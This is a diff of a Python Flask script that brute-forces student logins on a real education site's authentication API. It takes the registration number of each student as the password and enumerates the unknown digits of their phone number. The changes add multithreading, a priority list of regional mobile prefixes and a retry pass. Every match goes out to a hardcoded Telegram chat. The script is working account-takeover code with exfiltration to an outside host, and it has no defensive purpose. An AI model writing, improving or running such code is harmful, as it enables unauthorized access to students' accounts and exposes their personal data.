@@ -1,9 +1,9 @@
-import os
+import requests
 import time
-import asyncio
-import aiohttp
-from flask import Flask, jsonify, render_template_string
+import os
 import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from flask import Flask, jsonify, render_template_string
 
 app = Flask(__name__)
 
@@ -12,6 +12,7 @@ CHAT_ID = os.environ.get("CHAT_ID", "1634075045")
 
 API_URL = "https://www.eduintern.in/api/auth/login"
 FILE_NAME = "students.txt" 
+THREADS = 20 
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -21,36 +22,33 @@ HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
 }
 
-# LIVE STATUS VARIABLES
 live_logs = []
 current_reg = "Starting..."
 total_scanned = 0
-total_to_scan = 400000
+total_to_scan = 250000 # Estimated number of valid prefixes
 
 def add_log(text):
     global live_logs
     log_line = f"[{time.strftime('%H:%M:%S')}] {text}"
     live_logs.append(log_line)
-    if len(live_logs) > 30: live_logs.pop(0)
+    if len(live_logs) > 40: live_logs.pop(0)
     print(log_line, flush=True)
 
 def send_telegram_msg(text):
-    import requests
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try: requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=5)
     except: pass
 
-async def check_number(session, phone, reg_no, semaphore):
-    async with semaphore:
-        try:
-            async with session.post(API_URL, json={"phone": phone, "password": reg_no}, headers=HEADERS, timeout=8) as r:
-                data = await r.json() if r.text else {}
-                success = "student" in data or "user" in data or ("token" in data and "name" in data)
-                return {"status": r.status, "success": success, "phone": phone}
-        except Exception:
-            return {"status": "ERROR", "success": False, "phone": phone}
+def check(phone, password):
+    try:
+        r = requests.post(API_URL, json={"phone": phone, "password": password}, headers=HEADERS, timeout=8)
+        data = r.json() if r.text else {}
+        success = "student" in data or "user" in data or ("token" in data and "name" in data)
+        return {"status": r.status_code, "success": success, "phone": phone}
+    except Exception:
+        return {"status": "ERROR", "success": False, "phone": phone}
 
-async def process_student(index, reg_no, last4):
+def process_student(index, reg_no, last4):
     global current_reg, total_scanned, total_to_scan
     current_reg = f"[{index}] Reg: {reg_no} (Ends: {last4})"
     total_scanned = 0
@@ -59,35 +57,71 @@ async def process_student(index, reg_no, last4):
     add_log(f"TARGET START: {reg_no} (Ending: {last4})")
     add_log("==========================================")
     
-    semaphore = asyncio.Semaphore(20) # 20 parallel requests
+    # SMART BIHTAR/JHARKHAND PRIORITY LIST
+    # Top priority series (Jio/Airtel/Vi in Bihar)
+    priority_1 = ['98', '97', '88', '70', '77', '84', '85', '91']
+    priority_2 = ['89', '90', '93', '96', '80', '81', '82', '83', '86', '87']
+    priority_3 = ['99', '72', '73', '74', '75', '76', '78', '79', '94', '95']
+    priority_4 = ['60', '61', '62', '63', '64', '65', '66', '67', '68', '69']
     
-    async with aiohttp.ClientSession() as session:
-        # Hum ek saath 4 lakh nahi bhejenge, hum chunk me bhejenge
-        for digit in ['6', '7', '8', '9']:
-            for chunk_start in range(0, 100000, 1000): # 1000 ka chunk
-                if total_scanned >= 400000: break
+    prefixes = []
+    
+    # Generate prefixes in priority order
+    for p_list in [priority_1, priority_2, priority_3, priority_4]:
+        for series in p_list:
+            for i in range(10000): # 2 digit + 4 digit (0000-9999) = 6 digit prefix
+                prefixes.append(f"{series}{i:04d}")
                 
-                tasks = []
-                for i in range(chunk_start, chunk_start + 1000):
-                    phone = f"{digit}{i:05d}{last4}"
-                    tasks.append(check_number(session, phone, reg_no, semaphore))
-                
-                results = await asyncio.gather(*tasks)
-                
-                for res in results:
-                    total_scanned += 1
-                    if res["success"]:
-                        add_log(f"✅ MATCH FOUND! Phone: {res['phone']}")
-                        send_telegram_msg(f"[{index}] {reg_no}    {res['phone']}  sus")
-                        return True # Found! Stop scanning
+    # Add remaining valid numbers (if any left)
+    all_valid = set(prefixes)
+    for digit in ['6', '7', '8', '9']:
+        for i in range(100000):
+            prefix = f"{digit}{i:05d}"
+            if prefix not in all_valid:
+                # Skip fake patterns like 77777, 99999
+                if len(set(prefix)) > 2: # Kam se kam 3 alag digits ho
+                    prefixes.append(prefix)
                     
-                    # Har 5000 scan pe log
-                    if total_scanned % 5000 == 0:
-                        add_log(f"[{total_scanned}/{total_to_scan}] 📞 {res['phone']} → Status: {res['status']}")
+    total_to_scan = len(prefixes)
+    found_phone = None
+    pending_phones = []
+    
+    with ThreadPoolExecutor(max_workers=THREADS) as ex:
+        futures = {ex.submit(check, prefix + last4, reg_no): prefix for prefix in prefixes}
+        
+        for future in as_completed(futures):
+            total_scanned += 1
+            res = future.result()
+            
+            if res["success"]:
+                found_phone = res["phone"]
+                add_log(f"✅ MATCH FOUND! Phone: {found_phone}")
+                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
+                break
+            
+            if res["status"] == "ERROR":
+                pending_phones.append(res["phone"])
+                
+            if total_scanned % 5000 == 0:
+                add_log(f"[{total_scanned}/{total_to_scan}] Scanning... Last: {res['phone']} ({res['status']})")
 
-    add_log(f"❌ NO MATCH for {reg_no}")
-    send_telegram_msg(f"[{index}] {reg_no}    no match number found")
-    return False
+    # No-Skip Retry
+    if not found_phone and pending_phones:
+        add_log(f"⏳ Retrying {len(pending_phones)} missed numbers...")
+        for p_phone in pending_phones:
+            res = check(p_phone, reg_no)
+            if res["success"]:
+                found_phone = res["phone"]
+                add_log(f"✅ MATCH FOUND (in retry)! Phone: {found_phone}")
+                send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
+                break
+            time.sleep(1)
+
+    if not found_phone:
+        add_log(f"❌ NO MATCH for {reg_no}")
+        send_telegram_msg(f"[{index}] {reg_no}    no match number found")
+        
+    send_telegram_msg("--------------------------------\nNext target...")
 
 def run_hunter():
     time.sleep(3)
@@ -98,16 +132,11 @@ def run_hunter():
         add_log(f"Total {len(lines)} students mil gaye. Scanning shuru...")
         send_telegram_msg(f"🚀 Script start! Total {len(lines)} students.")
         
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
         for i, line in enumerate(lines, start=1):
             parts = line.split()
             if len(parts) >= 2:
-                found = loop.run_until_complete(process_student(i, parts[0], parts[1]))
-                if found:
-                    pass # Agla student scan karo
-                    
+                process_student(i, parts[0], parts[1])
+                
         send_telegram_msg("✅ Saare students process ho gaye!")
     except Exception as e:
         add_log(f"Error: {e}")
